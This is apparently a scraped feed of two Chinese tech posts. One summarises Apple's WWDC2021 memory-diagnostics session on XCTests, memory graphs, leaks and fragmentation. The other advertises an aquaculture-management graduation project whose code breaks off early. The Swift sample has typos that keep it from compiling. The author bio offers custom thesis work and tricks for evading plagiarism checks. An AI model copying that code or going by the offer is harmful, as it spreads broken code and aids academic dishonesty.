<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ae2656d9f2a34deaaa2680b4e29d5808~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc29uZ2dlYg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764476705&amp;x-signature=EEF1620%2Fr98jqssruvxbMrmOoNg%3D" alt="" loading="lazy"/></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.apple.com%2Fvideos%2Fplay%2Fwwdc2021%2F10180%2F%3Ftime%3D151" target="_blank" title="https://developer.apple.com/videos/play/wwdc2021/10180/?time=151" ref="nofollow noopener noreferrer">Dirty memory consists of memory written by your application. </a><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.apple.com%2Fvideos%2Fplay%2Fwwdc2021%2F10180%2F%3Ftime%3D155" target="_blank" title="https://developer.apple.com/videos/play/wwdc2021/10180/?time=155" ref="nofollow noopener noreferrer">It also includes all heap allocations </a><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.apple.com%2Fvideos%2Fplay%2Fwwdc2021%2F10180%2F%3Ftime%3D158" target="_blank" title="https://developer.apple.com/videos/play/wwdc2021/10180/?time=158" ref="nofollow noopener noreferrer">such as when you use malloc, decoded image buffers, </a><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.apple.com%2Fvideos%2Fplay%2Fwwdc2021%2F10180%2F%3Ftime%3D161" target="_blank" title="https://developer.apple.com/videos/play/wwdc2021/10180/?time=161" ref="nofollow noopener noreferrer">and frameworks.</a></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8b414cb8b3be4125a8174b5de7130d27~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc29uZ2dlYg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764476705&amp;x-signature=PA1bDhSb9K9jjYIAAWGfo7j%2BHUQ%3D" alt="" loading="lazy"/></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.apple.com%2Fvideos%2Fplay%2Fwwdc2021%2F10180%2F%3Ftime%3D164" target="_blank" title="https://developer.apple.com/videos/play/wwdc2021/10180/?time=164" ref="nofollow noopener noreferrer">Compressed memory refers to any dirty pages </a><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.apple.com%2Fvideos%2Fplay%2Fwwdc2021%2F10180%2F%3Ftime%3D167" target="_blank" title="https://developer.apple.com/videos/play/wwdc2021/10180/?time=167" ref="nofollow noopener noreferrer">that haven't recently been accessed </a><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.apple.com%2Fvideos%2Fplay%2Fwwdc2021%2F10180%2F%3Ftime%3D169" target="_blank" title="https://developer.apple.com/videos/play/wwdc2021/10180/?time=169" ref="nofollow noopener noreferrer">that the memory compressor has compressed. </a><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.apple.com%2Fvideos%2Fplay%2Fwwdc2021%2F10180%2F%3Ftime%3D172" target="_blank" title="https://developer.apple.com/videos/play/wwdc2021/10180/?time=172" ref="nofollow noopener noreferrer">These pages will be decompressed on access.</a></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/db0b1f4cfd1d427ba70fb7b64fe416b6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc29uZ2dlYg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764476705&amp;x-signature=S5%2FqfUsuSxFiH4krAx6NS3Ym9eU%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-3">Tools for profiling memory</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6ef50099abc741afafb7ab55379d1d5a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc29uZ2dlYg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764476705&amp;x-signature=Lgsn%2B0Yj9eEI4VlEn9fIdwhc9cg%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-4">Performance XCTests</h3>
<p>可以使用XCTests去检查各个功能的性能表现，比如</p>
<ul>
<li>Memory utilization，内存利用情况</li>
<li>CPU usage</li>
<li>Disk writes</li>
<li>Hitch rate，卡顿率</li>
<li>Wall clock time，功能的耗时情况</li>
<li>Application launch time</li>
</ul>
<h4 data-id="heading-5">Memory utilization 示例</h4>
<pre><code class="hljs language-scss" lang="scss">func <span class="hljs-built_in">testSaveMeal</span>() {
    let app = <span class="hljs-built_in">XCUIApplication</span>()
    let options = <span class="hljs-built_in">XCTMeasureOptions</span>()
    options<span class="hljs-selector-class">.invocationOptions</span> = <span class="hljs-selector-attr">[.manuallyStart]</span>
    <span class="hljs-built_in">measure</span>(metrics: [XCTMemoryMetric(application: aapp)<span class="hljs-number">1</span>
        options: options) {
        app<span class="hljs-selector-class">.launch</span>()
        <span class="hljs-built_in">startMeasuring</span>()
        app<span class="hljs-selector-class">.cells</span><span class="hljs-selector-class">.firstMatch</span><span class="hljs-selector-class">.buttons</span><span class="hljs-selector-attr">[<span class="hljs-string">"Save meal"</span>]</span><span class="hljs-selector-class">.firstMatch</span><span class="hljs-selector-class">.tap</span>()
        let savedButton = app<span class="hljs-selector-class">.cells</span><span class="hljs-selector-class">.firstMatch</span><span class="hljs-selector-class">.buttons</span><span class="hljs-selector-attr">[<span class="hljs-string">"Saved"</span>]</span><span class="hljs-selector-class">.firstMatch</span>
        XCTAssertTrue (savedButton.waitForExistendce(timeout: <span class="hljs-number">30</span>)
    }
}
</code></pre>
<p>上述代码检测的是点击“Save meal”按钮后内存的变化情况，变化情况如下图所示：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/19da0bfded9d4c89bdf48f4c8de680ad~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc29uZ2dlYg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764476705&amp;x-signature=fxTIQK5ANGh9N1agI0WgcUgVFD8%3D" alt="" loading="lazy"/></p>
<ol>
<li>Metric项可以选择不同的内存检测指标，如内存峰值还是普通内存值</li>
<li>底部柱状图表示是多次执行的情况</li>
<li>Average项表示的是所选Metric的均值情况</li>
<li>Baseline、Max STDDEV(最大标准差)则可以用来设置检测基线和上下浮动阈值</li>
<li>当检测结束后，可以通过Result查看本次检测结果变好了还是变差了</li>
</ol>
<h4 data-id="heading-6">Diagnostic collection</h4>
<p>Xcode 13中引入了两个有力的诊断数据Ktrace files和Memory graphs</p>
<p>执行Performance XCTests时可以开启他们</p>
<h5 data-id="heading-7">Ktrace files</h5>
<p>是一种专用的文件类型，用于分析卡顿问题，可以用Instrument直接打开</p>
<p>详情可以参考</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.apple.com%2Fvideos%2Fplay%2Fwwdc2019%2F411%2F" target="_blank" title="https://developer.apple.com/videos/play/wwdc2019/411/" ref="nofollow noopener noreferrer">Getting Started with Instruments</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.apple.com%2Fvideos%2Fplay%2Fwwdc2021%2F10258%2F" target="_blank" title="https://developer.apple.com/videos/play/wwdc2021/10258/" ref="nofollow noopener noreferrer">Understand and eliminate hangs from your app</a></li>
</ul>
<h5 data-id="heading-8">Memory graphs</h5>
<p>某一时刻，App内存中所有对象及引用关系数据</p>
<ul>
<li>在日常使用Xcode debug App时，我们也能看到内置的Memory graphs功能</li>
<li>下图为运行完XCTests后，结果中Memory graphs文件，也可以单独进行分析</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/089116f2d5b84de0991dbaf071e7ebc6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc29uZ2dlYg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764476705&amp;x-signature=uIh0zTXsp78E284cYAHrikWxCCQ%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-9">Types of memory issues</h2>
<p>内存问题类型有多种，本session中会介绍到Leaks（内存泄漏）和Heap size issues</p>
<h3 data-id="heading-10">Leaks</h3>
<p>对于内存泄漏问题，可以使用<code>leaks</code>命令对钱文忠的Memory graphs文件进行分析，查找泄漏的代码堆栈、是否存在循环引用</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f16fdcfd9db34262b3cdd633ccfa5806~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc29uZ2dlYg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764476705&amp;x-signature=d%2BWCKQOozPVhwqhhSFF7%2F1WUyFw%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-11">Heap size issues</h3>
<h4 data-id="heading-12">Heap allocations regressions</h4>
<p>堆内存占用的劣化问题</p>
<p>为减少使用堆内存开辟空间导致内存占用劣化，我们可以这样做：</p>
<ul>
<li>Remove unused allocations</li>
<li>Shrink overly large allocations</li>
<li>Deallocated memory you are finished with</li>
<li>Wait to allocate memory until you need it</li>
</ul>
<p>Session中提到，官方提供了如<code>vmmap</code>等一系列命令对前面生成的Memory graphs文件分析</p>
<h4 data-id="heading-13">Fragmentation</h4>
<p>Fragmentation译为碎片化</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/58b333abcdfd4de5b237790122abe4f2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc29uZ2dlYg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764476705&amp;x-signature=PfE33yDhxD0EqlNEg9l11I3RkLk%3D" alt="" loading="lazy"/></p>
<p>如何可以减少碎片化</p>
<ul>
<li>Allocate objects with similar lifetimes close to each other</li>
<li>Aim for 25% fragmentation</li>
<li>Use autorelease pools</li>
<li>Pay extra attention to long running processes</li>
<li>Use allocations track in Instruments</li>
</ul>
<p>也可以使用<code>vmmap</code>等命令查看碎片比例</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c3b7c06db7044e77957820a11bf70368~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc29uZ2dlYg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764476705&amp;x-signature=ahMRnfiNgnaWl6gbn4Idap3EpmI%3D" alt="" loading="lazy"/></p>
<ul>
<li>上图中FRAG是碎片比例</li>
<li>DIRTY SIZE表示碎片化导致的Dirty pages情况</li>
<li>DIRTY+SWAP FRAG SIZE表示的是碎片空间大小</li>
</ul>
<h2 data-id="heading-14">总结</h2>
<p>总结一下官方推荐的检测、诊断内存问题的最佳实践</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/deb7a70b74e8474696470073313fb2b0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc29uZ2dlYg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764476705&amp;x-signature=upICJhqYE8vy8SykTv3KJ3KQsyQ%3D" alt="" loading="lazy"/></p>
<p>第一步：先是检测</p>
<ol>
<li>针对业务功能/场景编写Performance XCTests</li>
<li>设置baseline（基线）进行测试</li>
<li>如果发现有regression（劣化），则收集诊断数据（Memory graphs or Ktrace）</li>
</ol>
<p>第二步：诊断</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3c089bf6b1af413f98093f85c7199723~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc29uZ2dlYg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764476705&amp;x-signature=%2B67eU1bNOvWz%2FjEXL61eh5W8l20%3D" alt="" loading="lazy"/></p>
<ol>
<li>检查最易发现的内存泄漏</li>
<li>再使用各种命令查看是否有堆内存劣化</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[计算机毕业设计推荐：基于SpringBoot的水产养殖管理系统【Java+spring boot+MySQL、Java项目、Java毕设、Java项目定制定做】]]></title>    <link>https://juejin.cn/post/7575090551357390900</link>    <guid>https://juejin.cn/post/7575090551357390900</guid>    <pubDate>2025-11-23T04:50:45.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575090551357390900" data-draft-id="7575162322239717376" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="计算机毕业设计推荐：基于SpringBoot的水产养殖管理系统【Java+spring boot+MySQL、Java项目、Java毕设、Java项目定制定做】"/> <meta itemprop="keywords" content="Java,Spring Boot,MySQL"/> <meta itemprop="datePublished" content="2025-11-23T04:50:45.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="计算机毕业设计小途"/> <meta itemprop="url" content="https://juejin.cn/user/3344059640330504"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            计算机毕业设计推荐：基于SpringBoot的水产养殖管理系统【Java+spring boot+MySQL、Java项目、Java毕设、Java项目定制定做】
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3344059640330504/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    计算机毕业设计小途
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T04:50:45.000Z" title="Sun Nov 23 2025 04:50:45 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>💖💖作者：计算机毕业设计小途
💙💙个人简介：曾长期从事计算机专业培训教学，本人也热爱上课教学，语言擅长Java、微信小程序、Python、Golang、安卓Android等，开发项目包括大数据、深度学习、网站、小程序、安卓、算法。平常会做一些项目定制化开发、代码讲解、答辩教学、文档编写、也懂一些降重方面的技巧。平常喜欢分享一些自己开发中遇到的问题的解决办法，也喜欢交流技术，大家有技术代码这一块的问题可以问我！
💛💛想说的话：感谢大家的关注与支持！
💜💜
<a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2F2501_92808674%2Fcategory_13011385.html" target="_blank" title="https://blog.csdn.net/2501_92808674/category_13011385.html" ref="nofollow noopener noreferrer">网站实战项目</a>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2F2501_92808674%2Fcategory_13011386.html" target="_blank" title="https://blog.csdn.net/2501_92808674/category_13011386.html" ref="nofollow noopener noreferrer">安卓/小程序实战项目</a>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2F2501_92808674%2Fcategory_13011387.html" target="_blank" title="https://blog.csdn.net/2501_92808674/category_13011387.html" ref="nofollow noopener noreferrer">大数据实战项目</a>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2F2501_92808674%2Fcategory_13011390.html%3Fspm%3D1001.2014.3001.5482" target="_blank" title="https://blog.csdn.net/2501_92808674/category_13011390.html?spm=1001.2014.3001.5482" ref="nofollow noopener noreferrer">深度学习实战项目</a></p>
</blockquote>
<p>@<a href="https://link.juejin.cn?target=%25E7%259B%25AE%25E5%25BD%2595" target="_blank" title="%E7%9B%AE%E5%BD%95" ref="nofollow noopener noreferrer">TOC</a></p>
<h2 data-id="heading-0">基于SpringBoot的水产养殖管理系统介绍</h2>
<p>本系统命名为《基于SpringBoot的水产养殖管理系统》，旨在通过信息化手段全面提升水产养殖行业的现代化管理水平。该系统采用B/S（Browser/Server）架构，核心技术栈强大且灵活。在后端，系统主要基于Java语言开发，并深度整合了Spring Boot框架，充分利用了Spring的依赖注入、Spring MVC的请求处理能力以及MyBatis的持久层操作，实现了高效稳定的业务逻辑处理；同时，系统也提供了Python语言版本，基于Django框架实现，为用户提供了多样化的技术选择。前端界面则由Vue.js框架配合ElementUI组件库及HTML技术构建，确保了用户界面的响应式、交互性和美观性，为用户提供流畅的操作体验。数据存储方面，系统选择成熟稳定的MySQL数据库，确保了数据的高效存取与管理。开发工具推荐使用IntelliJ IDEA进行Java版本开发，或PyCharm进行Python版本开发。系统功能模块设计周密，涵盖了水产养殖管理的各个核心环节，包括用户管理、水产种类管理、水产信息管理、水产产地管理以及至关重要的水产订单管理，构建了从生产到销售的完整链条。此外，系统还具备详细的养殖记录管理功能，方便用户追溯与分析；通过饲料信息管理、采购入库管理与出库信息管理，实现了对养殖物资的精细化管控。为了提升养殖技能与知识水平，系统特别集成了养殖培训管理、培训类型管理及培训报名管理模块，为养殖户提供学习交流平台。在平台运营层面，系统提供了直观的系统首页、个性化的个人中心、全面的系统管理功能、公告资讯分类与轮播图管理，确保了平台的信息发布与日常运维。智能客服模块的引入，旨在提升用户服务效率与体验；详尽的系统日志功能则保障了系统的可追溯性和安全性。通过这些模块的有机结合，本系统致力于为水产养殖企业提供一个集约化、智能化、数据化的综合管理解决方案，助力行业实现可持续发展和效率飞跃。</p>
<h2 data-id="heading-1">基于SpringBoot的水产养殖管理系统演示视频</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV1JAUNBiEzS%2F%3Fspm_id_from%3D333.1387.homepage.video_card.click" target="_blank" title="https://www.bilibili.com/video/BV1JAUNBiEzS/?spm_id_from=333.1387.homepage.video_card.click" ref="nofollow noopener noreferrer">演示视频</a></p>
<h2 data-id="heading-2">基于SpringBoot的水产养殖管理系统演示图片</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/18ee925be93d4aa7b85b4ffd663d41f3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6K6h566X5py65q-V5Lia6K6-6K6h5bCP6YCU:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764478245&amp;x-signature=ecU5OqgjJfIg4ulFcY%2B6dTP83Oo%3D" alt="采购入库.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bc60bb5db3394ade96aeaeab856654e8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6K6h566X5py65q-V5Lia6K6-6K6h5bCP6YCU:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764478245&amp;x-signature=hPce7eAqkQ%2Bh7D1rRMaUFPNYPZg%3D" alt="出库信息.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9bcf55771f8f450f92e57e5e12934cea~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6K6h566X5py65q-V5Lia6K6-6K6h5bCP6YCU:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764478245&amp;x-signature=yyVNqCzfAPoFenA6tQsoX%2B8XL%2Fs%3D" alt="培训报名.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/75ce0e78b1e74fdca8e931b12879a44c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6K6h566X5py65q-V5Lia6K6-6K6h5bCP6YCU:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764478245&amp;x-signature=uo3cj6p6ezGJjvnAJ2BjGS3V7j0%3D" alt="水产订单.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ccb25cc9882e45d09dbabae20605c402~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6K6h566X5py65q-V5Lia6K6-6K6h5bCP6YCU:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764478245&amp;x-signature=Cw0UVocsVKQ0pDq23Q9v0K3gb%2FU%3D" alt="水产信息.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b3ecb866651445729998fe42b2c8a935~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6K6h566X5py65q-V5Lia6K6-6K6h5bCP6YCU:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764478245&amp;x-signature=4MZE50OTOCEJ2ZqbuBLaCCbuLu4%3D" alt="饲料信息.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e206bfe1eb754d15bb25e690a6444d71~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6K6h566X5py65q-V5Lia6K6-6K6h5bCP6YCU:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764478245&amp;x-signature=ZwifH3Yzcok0yplnNvAht7QLv54%3D" alt="养殖记录.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/096d8b54b7584e38b24bc1b417018a89~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6K6h566X5py65q-V5Lia6K6-6K6h5bCP6YCU:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764478245&amp;x-signature=IyiUr%2BEyIGc%2B8RMqRpF5yJkqJIU%3D" alt="养殖培训.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/daa8f36111b14bb989bd12d1dfd1b4e5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6K6h566X5py65q-V5Lia6K6-6K6h5bCP6YCU:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764478245&amp;x-signature=Q0o2kokPYSGzYZfSZoiACZa%2FQ0E%3D" alt="用户管理.png" loading="lazy"/></p>
<h2 data-id="heading-3">基于SpringBoot的水产养殖管理系统代码展示</h2>
<pre><code class="hljs language-dart" lang="dart"># Big Data processing <span class="hljs-keyword">with</span> SparkSession.builder <span class="hljs-keyword">is</span> utilized <span class="hljs-keyword">for</span> advanced analytics and recommendation engines.
# All necessary imports are grouped at the top.
from pyspark.sql <span class="hljs-keyword">import</span> SparkSession
from pyspark.sql.functions <span class="hljs-keyword">import</span> avg, col, datediff, to_date, lit, count, when
from pyspark.ml.recommendation <span class="hljs-keyword">import</span> ALS
from pyspark.sql.types <span class="hljs-keyword">import</span> StructType, StructField, IntegerType, FloatType
from datetime <span class="hljs-keyword">import</span> datetime
<span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd # Used <span class="hljs-keyword">for</span> simulating small data <span class="hljs-keyword">for</span> Spark DataFrame creation <span class="hljs-keyword">if</span> needed, but not <span class="hljs-keyword">for</span> core logic itself
# --- Core Functionality <span class="hljs-number">1</span>: 养殖记录管理 (Farming Record Analytics) ---
# Analyzes historical farming records using Spark to detect anomalies or predict trends.
def analyze_farming_records_spark(record_data_path: str, species_thresholds: dict):
    spark = SparkSession.builder \
        .appName(<span class="hljs-string">"FarmingRecordAnalytics"</span>) \
        .config(<span class="hljs-string">"spark.some.config.option"</span>, <span class="hljs-string">"some-value"</span>) \
        .getOrCreate()
    df = spark.read.csv(record_data_path, header=True, inferSchema=True)
